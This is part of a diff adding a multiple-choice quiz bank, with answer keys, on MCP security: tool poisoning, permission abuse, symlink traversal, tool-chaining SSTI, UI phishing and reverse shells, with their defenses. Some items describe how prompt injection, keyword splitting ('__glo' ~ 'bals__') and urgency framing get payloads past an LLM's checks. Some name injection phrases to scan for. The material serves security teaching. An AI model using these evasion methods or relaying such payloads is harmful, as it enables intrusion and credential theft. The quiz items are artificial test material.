+      "options": [
+        "Rename the tool to something more descriptive of its actual full capabilities",
+        "Add a comment in the tool's code warning developers about the risk",
+        "Increase the AI model's safety training to refuse database-related questions",
+        "Scope the tool's database role to read-only access on only the customer_orders table specifically, applying least privilege rather than relying on the tool's description to imply restricted access"
+      ],
+      "answer": 3,
+      "explanation": "Since the vulnerability stems from the tool's actual database permissions exceeding what it should have, the fix requires scoping the underlying database role itself to least privilege, not relying on the tool's description or the model's judgment."
+    },
+    {
+      "q": "A file-read tool resolves paths using `os.path.realpath()` before checking the allowed prefix, correctly blocking both '..' traversal and most symlink tricks. An attacker discovers that a subdirectory within the allowed sandbox is itself a symlink created before the security fix was deployed, pointing to a sensitive external location. What does this scenario illustrate?",
+      "options": [
+        "This scenario is impossible since realpath always automatically removes any existing symlinks it encounters",
+        "realpath-based checks are fundamentally ineffective against any form of symlink-based attack",
+        "The fix should have used normpath instead of realpath to properly address this specific case",
+        "Fixing the path-checking logic doesn't retroactively address existing malicious or misconfigured symlinks already present within the sandboxed directory structure, requiring separate cleanup of existing symlinks"
+      ],
+      "answer": 3,
+      "explanation": "While realpath correctly resolves symlinks during path validation, it doesn't retroactively identify or remove pre-existing symlinks planted before the security fix — that requires a separate audit and cleanup of the sandbox's actual filesystem structure."
+    },
+    {
+      "q": "A tool-chaining attack splits an SSTI payload across four separate 'store item' calls, each individually passing an automated content scanner, and only assembles into a working exploit when a fifth 'compile and render' tool combines them. What defensive principle would most directly address this specific evasion technique?",
+      "options": [
+        "Disabling the compile and render tools entirely, removing the reporting feature altogether",
+        "Validating at every tool boundary rather than only at the initial entry point, so that suspicious patterns are checked both individually and in their assembled/combined form before reaching the vulnerable renderer",
+        "Relying exclusively on the AI's own built-in safety training to catch the assembled payload",
+        "Increasing the character limit on individual stored items to make fragmentation less effective"
+      ],
+      "answer": 1,
+      "explanation": "Since the attack specifically exploits the gap in validation between individual tool boundaries and the final combined data, checking at every boundary (including the final compile/render step) is needed to catch the assembled, exploitable pattern."
+    },
+    {
+      "q": "An MCP host renders tool-supplied HTML inside sandboxed iframes with a permissive Content Security Policy that doesn't restrict postMessage traffic. Separately, the host requires human approval only for tools categorized as 'high risk,' and a UI-rendering timer tool is categorized as 'low risk.' How could an attacker combine these two configurations to execute a credential-phishing attack with minimal friction?",
+      "options": [
+        "This combination of configurations provides complete protection against any form of UI-based phishing attack",
+        "Poison the low-risk timer tool's returned HTML with a fake login page, then use postMessage/AppBridge to exfiltrate stolen credentials through another already-approved tool, since the permissive CSP doesn't block this channel and no high-risk approval prompt is ever triggered",
+        "Low-risk tool categorization automatically disables all HTML rendering capabilities for that specific tool",
+        "The attacker would need to first compromise the human approval system directly, which is unrelated to CSP or tool risk categorization"
+      ],
+      "answer": 1,
+      "explanation": "Since the timer tool is categorized as low-risk (no approval needed) and the permissive CSP allows postMessage traffic, an attacker can swap its UI for a phishing page and exfiltrate data without triggering any approval prompt or CSP-based blocking."
+    },
+    {
+      "q": "A security team monitors for sudden tool description length increases and rapid tools/list calls, but doesn't monitor for unusual outbound network connections from MCP tool servers. Which attack class would most likely evade detection under this specific monitoring gap?",
+      "options": [
+        "Path traversal via symlinks, since this attack is exclusively detected through outbound network monitoring",
+        "Reverse shells established through SSTI/RCE, since the outbound connection to the attacker's listener is exactly the signal this monitoring gap fails to catch",
+        "Git history mining, since this attack always requires an unusual outbound connection to succeed",
+        "Tool description poisoning, since this attack is entirely dependent on outbound network monitoring to detect"
+      ],
+      "answer": 1,
+      "explanation": "Since a reverse shell specifically relies on an outbound connection from the compromised server back to the attacker, failing to monitor outbound connections to unusual hosts/ports leaves this particular attack class undetected even if other signals (like description length) are being watched."
+    },
+    {
+      "q": "An organization requires human approval for all tools performing financial transactions, but enforces this approval requirement entirely through instructions in the system prompt rather than in the orchestrator's code. What specific weakness does this design share with several attacks covered elsewhere in this domain?",
+      "options": [
+        "This design provides equivalent security to code-level enforcement, since the LLM always follows explicit system prompt instructions without exception",
+        "It relies on the LLM to self-enforce a security rule that a sufficiently persuasive prompt injection or claimed-authority attack could bypass, since prompt-based rules are not genuine access control",
+        "This weakness is unique to financial transaction tools and doesn't apply to any other tool category",
+        "System-prompt-based enforcement is actually more secure than code-level enforcement since it's easier to update"
+      ],
+      "answer": 1,
+      "explanation": "This mirrors the repeated warning against LLM self-authorization — prompt-based rules (including approval gating) can be talked around by a sufficiently persuasive attacker, unlike genuine code-level enforcement tied to the real authenticated context."
+    },
+    {
+      "q": "What is the difference between a 'Resource' and a 'Tool' in MCP, in terms of the actions they can take?",
+      "options": [
+        "Resources and Tools are functionally identical terms used interchangeably",
+        "Resources are read-only data fetched to give the AI context; Tools are actions that can genuinely change things, like writing a file or sending an email",
+        "Resources can modify data while Tools are strictly read-only",
+        "Resources are controlled by the model while Tools are controlled by the user"
+      ],
+      "answer": 1,
+      "explanation": "Resources are read-only context data fetched by the application, while Tools are model-invoked actions capable of making real changes to systems."
+    },
+    {
+      "q": "Who decides when a Prompt template gets used in an MCP system?",
+      "options": [
+        "The model, since prompts are dynamically generated at runtime",
+        "The Host, since prompts are automatically injected without any input",
+        "The user, since prompts are pre-made templates the user picks",
+        "The Server, since prompts are triggered by internal server logic"
+      ],
+      "answer": 2,
+      "explanation": "Prompts are user-controlled — the user actively chooses when to use a specific pre-made prompt template."
+    },
+    {
+      "q": "In the request flow, what happens after the model decides to call a specific tool?",
+      "options": [
+        "The Host actually calls the tool on the Server, and the result gets added back into the model's context",
+        "The request is automatically denied unless a human manually approves it first",
+        "The model itself directly executes the tool without any intermediary",
+        "The Client bypasses the Host entirely to communicate directly with the model"
+      ],
+      "answer": 0,
+      "explanation": "The model can only request a tool call; the Host is what actually executes it against the Server and feeds the result back into context."
+    },
+    {
+      "q": "Why might step 6 (the model calling a tool) repeat multiple times in a single MCP request flow?",
+      "options": [
+        "MCP protocol technically requires exactly three tool calls per request",
+        "The model may chain together several tool calls before producing a final answer",
+        "This step only repeats if the first tool call returns an error",
+        "Each tool call must be repeated three times for redundancy and error correction"
+      ],
+      "answer": 1,
+      "explanation": "Complex tasks often require the model to invoke multiple tools in sequence, using each result to inform the next decision before reaching a final answer."
+    },
+    {
+      "q": "Why does a shared enterprise MCP platform accessed over HTTP generally present a different recon approach than a developer's local stdio-based setup?",
+      "options": [
+        "HTTP-based platforms cannot be enumerated using standard MCP listing methods at all",
+        "There is no practical difference in recon approach between the two environments",
+        "A shared HTTP platform is reachable across a network and may connect to broader downstream infrastructure, while stdio setups are confined to the local machine and its own processes",
+        "stdio setups are always more valuable targets than any HTTP-based platform"
+      ],
+      "answer": 2,
+      "explanation": "The network-reachable nature of HTTP platforms versus the local-only nature of stdio processes changes both the attack surface and the value of what's potentially reachable."
+    },
+    {
+      "q": "What does a minimal MCP client script using a library like fastmcp allow a tester to do directly against a target server?",
+      "options": [
+        "Permanently modify the target server's tool descriptions",
+        "Connect to the server and call list_tools() and list_resources() to enumerate its full capability set programmatically",
+        "Automatically exploit any vulnerability found in the target server without further manual testing",
+        "Bypass all authentication mechanisms on the target server automatically"
+      ],
+      "answer": 1,
+      "explanation": "A basic MCP client script can programmatically call the standard listing methods to enumerate a server's tools and resources directly, without needing the AI's cooperation."
+    },
+    {
+      "q": "What should a defender do regarding the verbosity of tool descriptions to reduce reconnaissance value for attackers?",
+      "options": [
+        "Always write the longest, most detailed description possible for every tool",
+        "Avoid over-describing tools, since overly verbose descriptions end up leaking internal structure unnecessarily",
+        "Descriptions should only ever be one word long regardless of the tool's function",
+        "Tool description length has no bearing on security and can be ignored entirely"
+      ],
+      "answer": 1,
+      "explanation": "Minimizing unnecessary detail in tool descriptions reduces the amount of internal structure and capability information exposed to a potential attacker during enumeration."
+    },
+    {
+      "q": "Why is logging bursts of rapid tools/list, resources/list, or prompts/list calls recommended as a defensive practice?",
+      "options": [
+        "This defensive practice has no relationship to detecting reconnaissance activity",
+        "Many rapid list calls in a row can signal active reconnaissance underway by an attacker mapping the system",
+        "This logging is only useful for measuring the server's average response time",
+        "Rapid list calls are always a sign of a legitimate automated backup process"
+      ],
+      "answer": 1,
+      "explanation": "A burst of enumeration-style calls in quick succession is a behavioral pattern consistent with an attacker actively mapping out the system's capabilities."
+    },
+    {
+      "q": "Why is deleting a secret from a file in git comparable to covering a whiteboard secret with a sticky note?",
+      "options": [
+        "Because sticky notes are a common tool used in agile software development ceremonies",
+        "Anyone who 'lifts the note' (checks git history) still sees the secret underneath, since deleting a file only hides it from the current view, not from the historical record",
+        "Because this analogy demonstrates that deleted secrets are permanently and completely erased",
+        "Because both git and whiteboards use the exact same underlying storage technology"
+      ],
+      "answer": 1,
+      "explanation": "The analogy captures how a surface-level deletion (removing the file from the current version) doesn't erase the underlying historical record, just as a sticky note doesn't erase what's written beneath it."
+    },
+    {
+      "q": "What is the recommended way to prevent secrets from ever entering git in the first place?",
+      "options": [
+        "Rely exclusively on developers remembering not to commit sensitive files",
+        "Use secret managers (vaults) and short-lived tokens, and add pre-commit hooks/secret scanners that block commits containing keys before they're pushed",
+        "Store all secrets directly in a .env file and commit it as usual",
+        "Encrypt the entire repository after every commit using a shared password"
+      ],
+      "answer": 1,
+      "explanation": "Combining proper secret storage (vaults, short-lived tokens) with automated pre-commit scanning prevents secrets from entering version control at all, addressing the root cause rather than cleaning up afterward."
+    },
+    {
+      "q": "Should the MCP git server used by a developer's local AI assistant have access to production credential repositories?",
+      "options": [
+        "No — the git server should be scoped to specific repositories, and a workstation AI should never have access to production credential repositories",
+        "This decision has no security relevance since git servers cannot access repository contents",
+        "Yes, but only if the developer has been employed for more than one year",
+        "Yes — broader repository access always improves the AI assistant's helpfulness with no associated risk"
+      ],
+      "answer": 0,
+      "explanation": "Scoping the git server's repository access and specifically excluding production credential repos limits what an attacker could reach even if the developer's AI assistant is compromised or manipulated."
+    },
+    {
+      "q": "Which of these is listed as a specific keyword/pattern that defenders should scan for as a sign of tool description poisoning?",
+      "options": [
+        "The word 'format' appearing anywhere in the description",
+        "Phrases like 'SYSTEM INSTRUCTION' or 'do not reveal'",
+        "Any description shorter than 20 characters",
+        "The presence of a version number in the tool's metadata"
+      ],
+      "answer": 1,
+      "explanation": "Classic injection phrasing like 'SYSTEM INSTRUCTION' or instructions telling the model not to reveal something are recognizable red flags worth specifically scanning for."
+    },
+    {
+      "q": "Why would new network calls appearing in a tool's code be a suspicious detection signal for tool description poisoning?",
+      "options": [
+        "Network calls in tool code are a completely normal and expected feature with no security relevance",
+        "This signal only matters for tools that explicitly advertise network functionality in their description",
+        "New network calls always indicate the tool is being updated to a newer, more secure version",
+        "They could indicate the tool's code has been modified to add server-side exfiltration logic, sending stolen data to an attacker-controlled endpoint"
+      ],
+      "answer": 3,
+      "explanation": "Unexpected new network calls in a tool's actual implementation could represent added exfiltration logic, especially in a tool whose stated purpose doesn't require any external communication."
+    },
+    {
+      "q": "What is the recommended practice for reviewing changes made to tool descriptions?",
+      "options": [
+        "Description reviews are unnecessary as long as the tool's underlying code hasn't changed",
+        "Tool descriptions should be version-controlled and require multi-party code review before deployment, treated with the same rigor as production code",
+        "Only the original author of a tool should ever be allowed to review changes to its description",
+        "Tool descriptions should be editable freely by any team member with no review process at all"
+      ],
+      "answer": 1,
+      "explanation": "Treating description changes with the same review rigor as code changes (version control, multi-party approval) directly addresses the supply-chain risk of a single compromised editor poisoning a description."
+    },
+    {
+      "q": "Why does traditional security training about avoiding suspicious login pop-ups fail to protect users against MCP App phishing?",
+      "options": [
+        "MCP App phishing pages are visually indistinguishable from a browser's own native login prompt",
+        "Traditional security training has been proven completely ineffective against every type of phishing attack",
+        "Training generally teaches distrust of unfamiliar pop-ups but never taught users to distrust their own AI assistant specifically, and that gap is exactly what this attack exploits",
+        "Users who receive security training are immune to all forms of social engineering by definition"
+      ],
+      "answer": 2,
+      "explanation": "Since users have learned to trust their AI assistant as a legitimate tool, an attack rendered inside that trusted context bypasses the specific skepticism trained against traditional phishing vectors."
+    },
+    {
+      "q": "What should MCP Host builders show to help users distinguish genuinely legitimate content from potentially malicious tool-rendered UI?",
+      "options": [
+        "A clear, genuinely unspoofable indicator that content came from a tool, not from the operating system itself",
+        "A generic loading spinner that appears identical for all content types",
+        "A password field that automatically fills in the user's saved credentials",
+        "No visual indicator at all, since indicators can themselves be spoofed"
+      ],
+      "answer": 0,
+      "explanation": "A clear, tamper-resistant visual indicator helps users recognize when they're viewing tool-rendered content, providing a genuine signal distinct from what a malicious tool could easily fake."
+    },
+    {
+      "q": "What should never be allowed regarding rendered tool-supplied UI content and user credentials?",
+      "options": [
+        "This restriction only applies to tools categorized as high-risk by the platform",
+        "Rendered content should never be allowed to directly request user credentials",
+        "Rendered content should always be allowed to request credentials as long as it uses HTTPS",
+        "Credential requests are acceptable only from tools that have been installed for more than 90 days"
+      ],
+      "answer": 1,
+      "explanation": "Since a legitimate assistant has no genuine need to collect login credentials through a rendered UI, blocking this pattern entirely closes off a primary phishing vector."
+    },
+    {
+      "q": "What real-world signal should operators specifically monitor for regarding UI resource swaps and unexpected tool chains?",
+      "options": [
+        "A user requesting help with more than one task in a single conversation",
+        "Any tool call made during business hours on a weekday",
+        "A simple formatting request that also happens to call a timer tool, which is genuinely suspicious given the mismatch between the request and the tool invoked",
+        "A tool that has been used successfully more than 50 times without any errors"
+      ],
+      "answer": 2,
+      "explanation": "An unexpected, logically mismatched tool invocation (like a formatting request unexpectedly also triggering a UI-rendering timer tool) is a specific anomaly signal worth monitoring."
+    },
+    {
+      "q": "In the receptionist analogy for permission abuse, what does the 'master key to every room' represent?",
+      "options": [
+        "A cryptographic key used to encrypt all MCP traffic between Host and Server",
+        "A special administrator password shared among all authorized MCP users",
+        "The over-privileged actual access a tool has, despite its description implying a limited, specific scope like 'hand out visitor badges'",
+        "A literal physical key used to access the server room housing MCP infrastructure"
+      ],
+      "answer": 2,
+      "explanation": "The analogy illustrates the gap between a tool's stated limited purpose (handing out badges) and its actual broad access (master key), mirroring how a database tool's description may not reflect its true permission scope."
+    },
+    {
+      "q": "What confirms that a database tool 'owns absolutely everything,' during a permission-abuse probing sequence?",
+      "options": [
+        "Observing that the tool responds within under 100 milliseconds to every query",
+        "Successfully guessing the database administrator's password through brute force",
+        "Directly asking 'What role does this tool use?' and receiving a response confirming broad, unrestricted access",
+        "Finding a configuration file listing the tool's exact database credentials in plaintext"
+      ],
+      "answer": 2,
+      "explanation": "Simply asking the tool directly what role/permissions it operates under is enough to confirm over-privilege in an unguarded system, requiring no technical exploit at all."
+    },
+    {
+      "q": "Which of these correctly matches a symptom to its underlying cause in an MCP permission/traversal vulnerability?",
+      "options": [
+        "A tool leaking no information at all — caused by using string concatenation for SQL queries",
+        "A folder that looks like it's inside the sandbox but is actually a symlink pointing elsewhere — caused by using normpath instead of realpath for validation",
+        "A tool refusing all requests — caused by applying least privilege correctly",
+        "A tool responding slowly to queries — caused by using realpath instead of normpath for validation"
+      ],
+      "answer": 1,
+      "explanation": "This is the exact symlink escape scenario described — normpath's cosmetic-only path cleaning fails to detect that a directory is actually a symlink pointing outside the intended sandbox, unlike realpath."
+    },
+    {
+      "q": "What database design principle is recommended as an alternative to using one broad super-role for every MCP database tool?",
+      "options": [
+        "No database roles at all, relying entirely on application-layer checks",
+        "A single shared superuser account used across all tools for consistency",
+        "One role per user, shared identically across all tools that user might invoke",
+        "Separate database roles per tool, rather than relying on one broad role for everything"
+      ],
+      "answer": 3,
+      "explanation": "Assigning distinct, narrowly-scoped roles per tool ensures that even if one tool is compromised or misused, the resulting access is limited to exactly what that specific tool needs."
+    },
+    {
+      "q": "What is the recommended default-deny approach for MCP file access tools?",
+      "options": [
+        "Allow all paths by default and maintain a blocklist of known-dangerous ones",
+        "Permission decisions should be made randomly to avoid predictable patterns an attacker could exploit",
+        "Grant access based solely on the requesting user's job title",
+        "Deny by default and explicitly allowlist specific paths, rather than trying to block a list of known-bad paths"
+      ],
+      "answer": 3,
+      "explanation": "A default-deny, explicit-allowlist approach is more robust than trying to enumerate and block every possible dangerous path, since blocklists are easily bypassed by unanticipated variations."
+    },
+    {
+      "q": "In the assembly-line analogy for tool chaining, what does 'worker five' who 'opens packages and follows any written instructions found inside' represent?",
+      "options": [
+        "The original attacker who initiated the entire chain of tool calls",
+        "The MCP Host itself, which oversees the entire request-response cycle",
+        "A human security reviewer who manually inspects each package for threats",
+        "A downstream tool, such as a template-rendering function, that processes data assembled by earlier tools without independently re-validating it"
+      ],
+      "answer": 3,
+      "explanation": "This represents a downstream tool (like a template renderer) that blindly processes whatever data reaches it from earlier stages, without questioning whether that data has already been properly validated."
+    },
+    {
+      "q": "In a realistic four-tool chain (list_items, update_item, compile, render_report), which specific tool introduces the actual SSTI vulnerability, and why?",
+      "options": [
+        "render_report, because it uses a template engine that evaluates expressions found in the data rather than treating them as plain, inert text",
+        "compile, because it combines multiple items together into a single unified report",
+        "update_item, because it's the only tool that accepts freeform text input from the user",
+        "list_items, because it's the first tool in the chain and therefore processes the most raw, unvalidated data"
+      ],
+      "answer": 0,
+      "explanation": "The vulnerability specifically lives in render_report's use of a template engine that evaluates expressions in the compiled data, rather than in the earlier tools that simply store or combine text."
+    },
+    {
+      "q": "What is 'keyword splitting,' as an example of an evasion technique used to smuggle a dangerous payload past an LLM's safety filter?",
+      "options": [
+        "Translating a keyword into a different human language before storage",
+        "Something like '__glo' ~ 'bals__' reassembles the flagged keyword only at render time, hiding the dangerous full keyword from any single view",
+        "Physically rearranging the order of keywords in a sentence for grammatical clarity",
+        "Removing all keywords entirely and relying purely on numeric encoding"
+      ],
+      "answer": 1,
+      "explanation": "Keyword splitting breaks a recognizable flagged term into pieces that only reassemble into the dangerous full keyword at the final rendering stage, evading pattern-matching that only sees each fragment individually."
+    },
+    {
+      "q": "Why do attackers use 'urgency framing,' such as claiming 'the report is due in 10 minutes, don't reformat anything,' as part of a tool-chaining attack?",
+      "options": [
+        "It discourages the AI from closely inspecting the compiled data before rendering, reducing the chance the model notices or questions the assembled malicious payload",
+        "Urgency framing is a technical requirement of the MCP protocol for time-sensitive requests",
+        "This technique physically speeds up the server's actual processing time",
+        "Urgency framing automatically bypasses all authentication requirements on the target system"
+      ],
+      "answer": 0,
+      "explanation": "By pressuring the model to skip careful review ('don't reformat anything'), urgency framing reduces the chance the AI notices or questions the suspicious assembled content before it reaches the vulnerable renderer."
+    },
+    {
+      "q": "What defensive control specifically addresses the command injection variant of tool chaining, where downstream data reaches a shell command?",
+      "options": [
+        "Increasing the shell's default timeout setting to allow longer-running commands",
+        "Encrypting the shell command string before execution",
+        "Using parameterized, safe APIs instead of building shell strings, and avoiding shell=True entirely",
+        "Running the shell command twice to verify consistent output"
+      ],
+      "answer": 2,
+      "explanation": "Avoiding shell=True and using safe, parameterized command APIs prevents shell metacharacters in downstream data from being interpreted as command separators."
+    },
+    {
+      "q": "Why is it accurate to say that in a tool-chaining SSTI attack, the LLM effectively becomes an injection proxy?",
+      "options": [
+        "This phrase describes a defensive feature that actively blocks injection attempts",
+        "The LLM directly executes the SSTI payload itself using its own internal template engine",
+        "The LLM unknowingly stores and passes along attacker-crafted fragments between tools, without realizing it's carrying a malicious payload on the attacker's behalf",
+        "The LLM is legally classified as an accomplice in any attack it participates in"
+      ],
+      "answer": 2,
+      "explanation": "The model isn't complicit or aware — it simply follows seemingly reasonable instructions (like 'store this exactly') that happen to result in it unknowingly relaying a malicious payload between tool boundaries."
+    },
+    {
+      "q": "What is the significance of Jinja2's SandboxedEnvironment as a specific defensive control?",
+      "options": [
+        "It's a monitoring dashboard that displays template rendering statistics",
+        "It's a caching mechanism that speeds up repeated template rendering operations",
+        "It's a restricted execution environment that blocks access to dangerous attributes like __globals__, preventing the SSTI-to-RCE escalation path",
+        "It's a network firewall configuration unrelated to template rendering"
+      ],
+      "answer": 2,
+      "explanation": "SandboxedEnvironment specifically restricts what attributes and objects a template can access, directly blocking the __globals__-based escalation path used in SSTI-to-RCE attacks."
+    },
+    {
+      "q": "Why does running a tool server as a low-privilege user (rather than root) limit the impact of a successful RCE via SSTI?",
+      "options": [
+        "Even if an attacker achieves command execution, they're constrained to whatever limited access that low-privilege account actually has, rather than gaining full root control of the system",
+        "This configuration has no effect on the outcome of a successful RCE attack",
+        "Low-privilege accounts automatically detect and block any injected template code",
+        "Running as a low-privilege user makes SSTI attacks technically impossible to execute"
+      ],
+      "answer": 0,
+      "explanation": "Even a successful RCE is constrained by the privileges of the account it's running under — a low-privilege account limits the attacker's reach compared to a root-level compromise."
+    },
+    {
+      "q": "What defensive signal should be watched for specifically to catch reverse shell establishment attempts?",
+      "options": [
+        "Outbound connections heading to unusual hosts or ports",
+        "Inbound connections arriving from well-known, trusted IP ranges",
+        "The exact wall-clock time a tool description was last modified",
+        "The total number of tools registered on a given server"
+      ],
+      "answer": 0,
+      "explanation": "Since a reverse shell requires an outbound connection from the victim to the attacker's listener, monitoring for connections to unusual hosts/ports is a direct way to catch this specific behavior."
+    },
+    {
+      "q": "What is the primary defense specifically effective against path traversal attacks?",
+      "options": [
+        "Egress filtering",
+        "Resolve then check (realpath)",
+        "Sandbox engines",
+        "Strict CSP"
+      ],
+      "answer": 1,
+      "explanation": "The defense summary table maps path traversal specifically to the resolve-then-check pattern using realpath, distinguishing it from the defenses mapped to other attack classes."
+    },
+    {
+      "q": "What is the primary defense specifically effective against reverse shells?",
+      "options": [
+        "Egress filtering, non-root",
+        "Review + scan descriptions",
+        "Least privilege, scoped roles",
+        "Strict CSP, block postMessage"
+      ],
+      "answer": 0,
+      "explanation": "The defense summary table specifically maps reverse shells to egress filtering (blocking arbitrary outbound connections) and running services as non-root, limiting both the attack's success and its impact."
+    },
+    {
+      "q": "Why is TLS/HTTPS explicitly recommended for remote MCP servers, given MCP's own transport design?",
+      "options": [
+        "TLS is a mandatory built-in feature of the MCP protocol that cannot be disabled",
+        "HTTPS is recommended purely for SEO purposes and has no actual security benefit for MCP traffic",
+        "TLS is only relevant for MCP servers that handle financial transaction data specifically",
+        "MCP itself has no built-in encryption, so remote traffic needs TLS applied separately to protect it in transit"
+      ],
+      "answer": 3,
+      "explanation": "Since MCP as a protocol doesn't include built-in encryption, operators must explicitly add TLS/HTTPS for any remote server communication to protect data in transit."
+    },
+    {
+      "q": "Why should local MCP servers be bound to localhost only, unless remote access is genuinely needed?",
+      "options": [
+        "Localhost binding is required by the MCP protocol specification for all server types",
+        "Binding to localhost prevents the server from being reachable over the network at all, reducing exposure unless remote access is an actual functional requirement",
+        "Binding to localhost automatically encrypts all traffic without needing TLS configuration",
+        "This binding choice only affects server startup speed and has no security implications"
+      ],
+      "answer": 1,
+      "explanation": "Restricting a server to localhost-only access means it simply isn't reachable from the network, eliminating an entire class of remote attack unless that reachability is genuinely required."
+    },
+    {
+      "q": "In the well-secured MCP tool example, why does the read_doc function explicitly avoid making any network calls, using any encoding functions, or invoking a shell?",
+      "options": [
+        "Keeping the tool's implementation minimal and free of unnecessary capabilities reduces its potential for abuse even if its description or inputs were somehow compromised",
+        "Network calls, encoding, and shell access are technically incompatible with the Python language used to write the tool",
+        "Avoiding these features makes the tool run measurably faster with no security benefit",
+        "This restriction is required by a specific licensing agreement covering the fastmcp library"
+      ],
+      "answer": 0,
+      "explanation": "Minimizing a tool's actual capabilities to exactly what its stated job requires (reading a file, nothing more) reduces what an attacker could achieve even if some other part of the system were compromised."
+    },
+    {
+      "q": "What should happen with every single tool call made through an MCP platform, from a logging standpoint?",
+      "options": [
+        "Only tool calls that fail with an error should be logged, to save storage space",
+        "Tool calls should never be logged, to protect user privacy",
+        "Every tool call should be logged, including arguments, results, and the initiating user",
+        "Logging should only occur for tools explicitly categorized as high-risk"
+      ],
+      "answer": 2,
+      "explanation": "Comprehensive logging of every tool call (not just failures or high-risk ones) provides the full visibility needed to investigate incidents and detect anomalies after the fact."
+    }
+  ]
+}
